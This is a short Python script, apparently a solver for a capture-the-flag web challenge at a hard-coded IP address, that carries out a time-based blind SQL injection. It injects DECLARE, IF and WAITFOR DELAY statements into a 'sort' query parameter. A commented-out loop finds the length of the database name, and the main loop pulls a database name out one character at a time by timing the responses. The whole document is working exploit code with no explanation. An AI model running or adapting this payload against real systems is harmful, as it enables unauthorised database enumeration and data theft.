import requests, time, string

# for i in range(100):
#     print(i)
#     start = time.time()
#     url = f"http://167.172.85.253/web100/?sort=id+DECLARE+%40a+VARCHAR(100)+SET+@a=(SELECT+DB_NAME()+AS+[Current+Database])+IF+(len(@a)={i})+WAITFOR+DELAY+'0%3a0%3a10'+%00"
#     r = requests.get(url=url)
#     if ("Error" in r.text):
#         print("Error")
#         break
#     if (time.time() - start > 10):
#         print("OK:", i)
#         break

char = string.ascii_lowercase + string.ascii_uppercase
print(char)
ans = ""
d = 0
for i in range(1, 1000):
    for c in range(32, 127):
        d = d + 1
        if (d == 50):
            time.sleep(3)
            d = 0
        start = time.time()
        url = f"http://167.172.85.253/web100/?sort=id+DECLARE+%40a+VARCHAR(100)+SET+@a=(SELECT+DB_NAME(6)+AS+[Current+Database])+IF+(ASCII(SUBSTRING(@a,{i},1))={c})+WAITFOR+DELAY+'0%3a0%3a10'+%00"
        r = requests.get(url=url)
        if ("Error" in r.text):
            print("Error", chr(c))
            exit()
        if (time.time() - start > 10):
            ans = ans + chr(c)
            print("OK: ", ans)
            break
        else: 
            print(i, ' ', c)
        if (c == 126):
            print(ans)
            exit()